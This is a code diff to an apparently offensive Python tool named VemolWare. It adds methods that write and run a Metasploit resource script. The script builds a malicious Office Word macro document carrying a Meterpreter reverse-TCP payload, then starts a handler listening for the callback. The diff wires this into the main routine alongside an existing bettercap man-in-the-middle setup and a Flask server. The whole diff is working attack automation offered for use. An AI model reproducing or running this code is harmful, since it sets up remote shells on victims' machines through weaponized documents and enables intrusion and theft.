@@ -73,10 +73,30 @@ class VemolWare:
         command = f'gnome-terminal -- python3 app.py {self.option_domain}'
         os.system(command)
     
+    def create_config_file_metasploit(self):
+        file = open('commands_msf.txt','w')
+        file.write(f'use exploit/multi/fileformat/office_word_macro\n')
+        file.write(f'set payload windows/meterpreter/reverse_tcp\n')
+        file.write(f'set lhost {LOCAL_IP}\n')
+        file.write(f'run\n')
+        file.write(f'use exploit/multi/handler\n')
+        file.write(f'set lhost {LOCAL_IP}\n')
+        file.write(f'set payload windows/meterpreter/reverse_tcp\n')
+        file.write(f'set lhost {LOCAL_IP}\n')
+        file.write(f'exploit -j\n')
+        file.close()
+
+    def start_metasploit(self):
+        # Starting MSFConsole
+        self.create_config_file_metasploit()
+        command = f'gnome-terminal -- msfconsole -r commands_msf.txt'
+        os.system(command)
+    
     def main(self):
         self.create_config_file_bettercap()
         self.bettercap()
         self.flask_server()
+        self.start_metasploit()
 
 
 if __name__ == "__main__":
